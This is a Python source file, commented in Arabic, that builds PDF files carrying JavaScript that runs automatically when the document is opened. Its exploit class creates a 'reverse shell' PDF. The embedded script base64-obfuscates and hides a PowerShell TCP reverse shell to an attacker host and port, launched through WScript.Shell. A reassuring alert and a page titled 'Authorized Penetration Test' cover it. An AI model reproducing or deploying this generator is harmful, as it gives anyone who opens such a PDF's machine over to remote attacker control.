#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PDF Engine Core - محرك إنشاء ملفات PDF
"""

import os
import sys
import zlib
import base64
import struct
import random
import hashlib
from io import BytesIO
from datetime import datetime


class PDFDocument:
    """مستند PDF كامل"""
    
    def __init__(self):
        self.objects = {}
        self.streams = {}
        self.xref_offsets = {}
        self.next_obj = 1
        self.trailer_id = hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest().upper()
        self._init_document()
    
    def _init_document(self):
        self.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R /Names 8 0 R >>")
        self.add_object(2, b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>")
        self.add_object(3, b"<< /S /JavaScript /JS (app.alert('Loading...');) >>")
    
    def add_object(self, obj_num, data):
        self.objects[obj_num] = data
        self.next_obj = max(self.next_obj, obj_num + 1)
        return obj_num
    
    def add_stream(self, data, compress=True):
        obj_num = self.next_obj
        self.next_obj += 1
        self.streams[obj_num] = {
            'data': data,
            'compress': compress
        }
        return obj_num
    
    def add_page(self, content):
        page_num = self.next_obj
        self.next_obj += 1
        
        font1 = self.next_obj
        self.add_object(font1, b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")
        self.next_obj = font1 + 1
        
        content_obj = self.add_stream(content.encode('latin-1', errors='replace'))
        
        page_data = f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 {font1} 0 R >> >> /Contents {content_obj} 0 R >>"
        self.add_object(page_num, page_data.encode())
        
        return page_num
    
    def embed_javascript(self, js_code):
        js_obj = self.next_obj
        self.next_obj += 1
        
        # OpenAction
        self.objects[3] = f"<< /S /JavaScript /JS ({self._escape_js(js_code)}) >>".encode()
        
        # JavaScript object
        js_action = f"<< /S /JavaScript /JS ({self._escape_js(js_code)}) >>"
        self.add_object(js_obj, js_action.encode())
        
        # Names tree
        names = f"<< /JavaScript << /Names [(EmbeddedJS) {js_obj} 0 R] >> >>"
        if 8 in self.objects:
            self.objects[8] = names.encode()
        else:
            self.add_object(8, names.encode())
        
        return js_obj
    
    def _escape_js(self, js_code):
        escaped = js_code.replace('\\', '\\\\')
        escaped = escaped.replace('(', '\(')
        escaped = escaped.replace(')', '\)')
        escaped = escaped.replace('\n', '\\n')
        escaped = escaped.replace('\r', '\\r')
        escaped = escaped.replace('\t', '\\t')
        return escaped
    
    def obfuscate_javascript(self, js_code):
        b64 = base64.b64encode(js_code.encode()).decode()
        return f'eval(atob("{b64}"));'
    
    def build(self):
        output = BytesIO()
        
        # Header
        output.write(b"%PDF-1.7\n%\xFF\xFF\xFF\xFF\n")
        
        # Objects
        for obj_num in sorted(self.objects.keys()):
            self.xref_offsets[obj_num] = output.tell()
            obj_data = self.objects[obj_num]
            output.write(f"{obj_num} 0 obj\n".encode())
            output.write(obj_data)
            output.write(b"\nendobj\n")
        
        # Streams
        for obj_num in sorted(self.streams.keys()):
            self.xref_offsets[obj_num] = output.tell()
            stream = self.streams[obj_num]
            
            data = stream['data']
            if stream['compress']:
                data = zlib.compress(data)
                stream_dict = f"{obj_num} 0 obj\n<< /Length {len(data)} /Filter /FlateDecode >>\n"
            else:
                stream_dict = f"{obj_num} 0 obj\n<< /Length {len(data)} >>\n"
            
            output.write(stream_dict.encode())
            output.write(b"stream\n")
            output.write(data)
            output.write(b"\nendstream\nendobj\n")
        
        # Xref
        xref_offset = output.tell()
        max_obj = max(list(self.objects.keys()) + list(self.streams.keys()) + [0]) + 1
        output.write(b"xref\n")
        output.write(f"0 {max_obj + 1}\n".encode())
        output.write(b"0000000000 65535 f \n")
        
        for i in range(1, max_obj + 1):
            if i in self.xref_offsets:
                output.write(f"{self.xref_offsets[i]:010d} 00000 n \n".encode())
            else:
                output.write(b"0000000000 00000 f \n")
        
        # Trailer
        output.write(b"trailer\n")
        output.write(f"<< /Size {max_obj + 1} /Root 1 0 R /ID [<{self.trailer_id}> <{self.trailer_id}>] >>\n".encode())
        output.write(f"startxref\n{xref_offset}\n%%EOF\n".encode())
        
        return output.getvalue()
    
    def save(self, filename):
        data = self.build()
        with open(filename, 'wb') as f:
            f.write(data)
        return filename


class PDFExploitEngine:
    """محرك استغلال PDF"""
    
    def create_exploit_pdf(self, technique, params):
        doc = PDFDocument()
        
        lhost = params.get('lhost', '127.0.0.1')
        lport = params.get('lport', 4444)
        output = params.get('output', 'exploit.pdf')
        
        if technique == 'reverse_shell':
            js = f'''
            try {{
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("powershell -NoP -NonI -W Hidden -Exec Bypass -c \\"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()\\"", 0, false);
            }} catch(e) {{}}
            app.alert("Document loaded successfully.");
            '''
        else:
            js = 'app.alert("Document loaded.");'
        
        doc.embed_javascript(doc.obfuscate_javascript(js))
        
        page = f'''
        BT /F1 24 Tf 50 750 Td (Security Document) Tj ET
        BT /F1 12 Tf 50 700 Td (Authorized Penetration Test) Tj ET
        BT /F1 10 Tf 50 650 Td (Loading...) Tj ET
        '''
        doc.add_page(page)
        
        return doc.save(output)
